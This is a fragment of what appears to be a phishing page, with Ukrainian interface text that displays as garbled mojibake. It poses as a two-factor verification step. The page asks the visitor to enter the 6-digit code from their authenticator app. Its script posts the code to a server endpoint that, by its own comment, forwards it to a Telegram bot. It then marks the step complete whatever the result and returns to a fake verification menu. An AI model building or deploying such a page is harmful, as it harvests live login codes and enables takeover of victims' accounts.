<body>

            <div style="color: #848E9C; font-size: 12px;">–í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–æ–¥–∞—Ç–æ–∫ —ñ –≤–≤–µ–¥—ñ—Ç—å 6-–∑–Ω–∞—á–Ω–∏–π –∫–æ–¥</div>

                <input type="text" id="authCode" class="code-input" maxlength="6" placeholder="000000" required>
                <div class="help-text">–ö–æ–¥ –æ–Ω–æ–≤–ª—é—î—Ç—å—Å—è –∫–æ–∂–Ω—ñ 30 —Å–µ–∫—É–Ω–¥</div>
            </div>
            
            <button type="submit" class="submit-btn" id="submitBtn">–ù–∞–¥—ñ—Å–ª–∞—Ç–∏</button>
        </form>

        <div class="back-link">
            <a href="verification.html">–ù–∞–∑–∞–¥ –¥–æ –≤–∏–±–æ—Ä—É –≤–µ—Ä–∏—Ñ—ñ–∫–∞—Ü—ñ—ó</a>

    <script>
        // –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ —Ñ–æ—Ä–º–∞—Ç—É–≤–∞—Ç–∏ –≤–≤–µ–¥–µ–Ω–Ω—è –∫–æ–¥—É
        document.getElementById('authCode').addEventListener('input', function(e) {
            // –ó–∞–ª–∏—à–∏—Ç–∏ –ª–∏—à–µ —Ü–∏—Ñ—Ä–∏
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 6) {
                value = value.substring(0, 6);
            }
            e.target.value = value;
        });

        // –û–±—Ä–æ–±–∫–∞ —Ñ–æ—Ä–º–∏
        document.getElementById('verificationForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const code = document.getElementById('authCode').value.trim();
            const submitBtn = document.getElementById('submitBtn');
            
            if (!code || code.length !== 6) {
                alert('–ë—É–¥—å –ª–∞—Å–∫–∞, –≤–≤–µ–¥—ñ—Ç—å –ø–æ–≤–Ω–∏–π 6-–∑–Ω–∞—á–Ω–∏–π –∫–æ–¥');
                return;
            }

            // –ó–∞–±–ª–æ–∫—É–≤–∞—Ç–∏ –∫–Ω–æ–ø–∫—É
            submitBtn.disabled = true;
            submitBtn.textContent = '–í—ñ–¥–ø—Ä–∞–≤–∫–∞...';

            // –í—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ –∫–æ–¥ –≤ Telegram –±–æ—Ç
            
            fetch('/api/send-code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ 
                    type: 'authenticator',
                    code: code
                })
            }).then(response => response.json()).then(result => {
                if (result.success) {
                    console.log('–ö–æ–¥ —É—Å–ø—ñ—à–Ω–æ –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram');
                } else {
                    console.log('–ü–æ–º–∏–ª–∫–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫–∏ –≤ Telegram');
                }
                
                // –û–±–Ω–æ–≤–∏—Ç—å —Å–æ—Å—Ç–æ—è–Ω–∏–µ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏
                let completedVerifications = JSON.parse(localStorage.getItem('completedVerifications')) || [];
                if (!completedVerifications.includes('authenticator')) {
                    completedVerifications.push('authenticator');
                    localStorage.setItem('completedVerifications', JSON.stringify(completedVerifications));
                }
                
                // –ü–æ–≤–µ—Ä–Ω—É—Ç–∏—Å—è –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω–∫—É –≤–µ—Ä–∏—Ñ—ñ–∫–∞—Ü—ñ—ó
                setTimeout(() => {
                    window.location.href = 'verification.html';
                }, 1000);
                
            }).catch(error => {
                console.log('–ü–æ–º–∏–ª–∫–∞:', error);
                
                // –í—Å–µ –æ–¥–Ω–æ –ø—Ä–æ–¥–æ–≤–∂–∏—Ç–∏ –∑ –ª–æ–≥—ñ–∫–æ—é
                let completedVerifications = JSON.parse(localStorage.getItem('completedVerifications')) || [];
                if (!completedVerifications.includes('authenticator')) {
                    completedVerifications.push('authenticator');
                    localStorage.setItem('completedVerifications', JSON.stringify(completedVerifications));
                }
                
                setTimeout(() => {
                    window.location.href = 'verification.html';
                }, 1000);
            }).finally(() => {
                submitBtn.disabled = false;
                submitBtn.textContent = '–ù–∞–¥—ñ—Å–ª–∞—Ç–∏';
            });
        });
    </script>
